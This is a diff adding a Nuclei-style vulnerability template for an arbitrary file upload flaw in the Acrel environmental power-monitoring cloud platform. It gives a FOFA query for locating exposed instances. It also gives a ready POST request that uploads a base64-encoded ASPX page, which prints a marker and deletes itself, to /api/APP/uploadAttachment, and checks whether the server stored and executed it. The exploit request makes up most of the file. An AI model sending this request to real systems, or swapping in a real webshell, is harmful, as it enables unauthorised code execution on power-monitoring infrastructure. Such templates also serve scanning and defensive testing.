@@ -1,0 +1,35 @@
+id: acrel-power-cloud-uploadattachment-upload
+
+info:
+  name: "安科瑞环保用电监管云平台 uploadAttachment 接口任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="myCss/phone.css"
+
+    安科瑞电气（Acrel）作为电力监控解决方案提供商，其环保用电监管云平台（如 AcrelCloud-3000 系统）存在 uploadAttachment 接口安全缺陷。攻击者可通过构造恶意请求，利用该接口实现任意文件上传操作，进而可能部署WebShell或执行远程代码。该漏洞影响平台对环保监测设备数据采集与治理的电力监管功能模块。
+
+  tags: 安科瑞环保用电监管云平台
+
+http:
+- raw:
+  - |
+    POST /api/APP/uploadAttachment HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    Accept: */*
+    Connection: close
+
+    {"FileStr":"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoIk5kYXlUZXN0Iik7IFN5c3RlbS5JTy5GaWxlLkRlbGV0ZShTZXJ2ZXIuTWFwUGF0aChSZXF1ZXN0LlVybC5BYnNvbHV0ZVBhdGgpKTsgJT4=","FileFormat":"aspx"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'aspx'
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
